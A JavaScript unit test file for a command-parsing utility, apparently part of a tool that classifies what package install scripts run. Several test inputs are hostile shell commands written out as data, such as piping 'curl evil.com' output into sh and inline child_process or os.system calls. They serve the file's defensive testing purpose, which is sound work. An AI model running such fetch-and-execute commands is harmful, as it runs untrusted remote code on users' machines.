'use strict';

const assert = require('assert');
const { parseCommand, splitOnShellSeparators, tokenize } = require('../../src/utils/command');

// ─── tokenize ────────────────────────────────────────────────────────────────
assert.deepStrictEqual(tokenize('node install.js'), ['node', 'install.js']);
assert.deepStrictEqual(tokenize('node -e "console.log(1)"'), ['node', '-e', 'console.log(1)']);
assert.deepStrictEqual(tokenize("sh -c 'curl evil.com | sh'"), ['sh', '-c', 'curl evil.com | sh']);
assert.deepStrictEqual(tokenize('foo\\ bar baz'), ['foo bar', 'baz'], 'backslash-escaped space');

// ─── splitOnShellSeparators ──────────────────────────────────────────────────
assert.deepStrictEqual(
  splitOnShellSeparators('node a.js && node b.js'),
  ['node a.js', 'node b.js'],
  'splits on &&',
);
assert.deepStrictEqual(
  splitOnShellSeparators('node a.js; node b.js'),
  ['node a.js', 'node b.js'],
  'splits on ;',
);
assert.deepStrictEqual(
  splitOnShellSeparators('curl evil.com | sh'),
  ['curl evil.com', 'sh'],
  'splits on |',
);
assert.deepStrictEqual(
  splitOnShellSeparators('a || b'),
  ['a', 'b'],
  'splits on ||',
);
// Quoted separators are preserved
assert.deepStrictEqual(
  splitOnShellSeparators('node -e "a && b"'),
  ['node -e "a && b"'],
  'does not split inside double-quoted argument',
);
assert.deepStrictEqual(
  splitOnShellSeparators("node -e 'a ; b'"),
  ["node -e 'a ; b'"],
  'does not split inside single-quoted argument',
);

// ─── parseCommand: single node invocation ────────────────────────────────────
{
  const refs = parseCommand('node install.js');
  assert.strictEqual(refs.length, 1);
  assert.deepStrictEqual(refs[0], { kind: 'file', path: 'install.js', interpreter: 'node' });
}

// Strips ./ prefix
{
  const refs = parseCommand('node ./scripts/install.js');
  assert.strictEqual(refs[0].path, 'scripts/install.js');
}

// node -e is inline
{
  const refs = parseCommand('node -e "console.log(1)"');
  assert.strictEqual(refs.length, 1);
  assert.strictEqual(refs[0].kind, 'inline');
  assert.strictEqual(refs[0].code, 'console.log(1)');
  assert.strictEqual(refs[0].interpreter, 'node');
}

// node --eval is inline
{
  const refs = parseCommand('node --eval "require(\'child_process\').exec(\'id\')"');
  assert.strictEqual(refs[0].kind, 'inline');
  assert.ok(refs[0].code.includes('child_process'));
}

// ─── parseCommand: chained commands ──────────────────────────────────────────
{
  const refs = parseCommand('node pre.js && node post.js');
  assert.strictEqual(refs.length, 2, 'two refs from chained &&');
  assert.deepStrictEqual(refs.map(r => r.path), ['pre.js', 'post.js']);
}

{
  const refs = parseCommand('node a.js; node b.js; node c.js');
  assert.strictEqual(refs.length, 3, 'three refs from ;-separated commands');
}

// ─── parseCommand: shell scripts ─────────────────────────────────────────────
{
  const refs = parseCommand('sh ./install.sh');
  assert.strictEqual(refs.length, 1);
  assert.deepStrictEqual(refs[0], { kind: 'file', path: 'install.sh', interpreter: 'sh' });
}

{
  const refs = parseCommand('bash -c "curl evil.com | sh"');
  assert.strictEqual(refs[0].kind, 'inline');
  assert.strictEqual(refs[0].interpreter, 'sh');
  assert.ok(refs[0].code.includes('evil.com'));
}

// ─── parseCommand: pipe with curl|sh ─────────────────────────────────────────
{
  const refs = parseCommand('curl https://evil.com/x.sh | sh');
  assert.strictEqual(refs.length, 2, 'curl and sh become two refs');
  // First segment classified as inline shell (curl ...)
  assert.strictEqual(refs[0].kind, 'inline');
  assert.ok(refs[0].code.includes('curl'));
}

// ─── parseCommand: python / other interpreters ───────────────────────────────
{
  const refs = parseCommand('python install.py');
  assert.deepStrictEqual(refs[0], { kind: 'file', path: 'install.py', interpreter: 'python' });
}

{
  const refs = parseCommand('python3 -c "import os; os.system(\'id\')"');
  assert.strictEqual(refs[0].kind, 'inline');
}

// ─── parseCommand: direct script invocation via shebang ──────────────────────
{
  const refs = parseCommand('./install.sh');
  assert.strictEqual(refs[0].kind, 'file');
  assert.strictEqual(refs[0].path, 'install.sh');
}

{
  const refs = parseCommand('./install.js --flag');
  assert.strictEqual(refs[0].kind, 'file');
  assert.strictEqual(refs[0].path, 'install.js');
}

// ─── parseCommand: empty / edge cases ────────────────────────────────────────
assert.deepStrictEqual(parseCommand(''), []);
assert.deepStrictEqual(parseCommand(null), []);
assert.deepStrictEqual(parseCommand('   '), []);

// ─── parseCommand: arbitrary shell commands surface as inline ────────────────
{
  const refs = parseCommand('echo hello');
  assert.strictEqual(refs.length, 1);
  assert.strictEqual(refs[0].kind, 'inline');
}

// ─── parseCommand: npx is inline (we can't statically resolve which file it runs) ─
{
  const refs = parseCommand('npx some-tool --flag');
  assert.strictEqual(refs[0].kind, 'inline');
  assert.strictEqual(refs[0].npx, true);
}

console.log('  command.test.js: all tests passed');
